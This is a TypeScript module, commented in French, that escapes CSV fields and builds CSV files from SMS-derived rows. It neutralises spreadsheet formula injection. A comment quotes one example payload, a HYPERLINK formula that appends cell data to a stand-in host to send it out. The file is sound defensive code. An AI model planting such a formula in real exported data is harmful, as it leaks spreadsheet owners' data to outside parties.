// UN CHAMP CSV — le bilan et le relevé de compte écrivent leurs cellules ici.
//
// Deux protections :
//   1. le texte d'un SMS peut tout contenir — on l'entoure de guillemets dès
//      qu'il porte le séparateur, un guillemet ou un saut de ligne ;
//   2. surtout, un tableur voit une cellule qui commence par « = + - @ »
//      (ou une tabulation) comme une FORMULE. Un SMS piégé
//      « =HYPERLINK("http://vol.example"&A1,"clic") » s'exécuterait alors à
//      l'ouverture du fichier dans Excel, dans le compte du propriétaire.
//      On désamorce en préfixant ces cellules d'une apostrophe : le tableur
//      l'affiche comme du texte, la valeur reste lisible.
//
// Écrit une fois : le relevé l'aurait sinon recopié, et une protection
// recopiée finit par ne plus être la même des deux côtés.
export function champCsv(v: string | number | null | undefined): string {
  let s = v == null ? "" : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Des rangées en un fichier : points-virgules, fins de ligne Windows, et le
 *  BOM en tête — sans lui, Excel ouvre l'UTF-8 en dépit du bon sens. */
export function fichierCsv(rangs: (string | number | null | undefined)[][]): string {
  return "﻿" + rangs.map((r) => r.map(champCsv).join(";")).join("\r\n") + "\r\n";
}
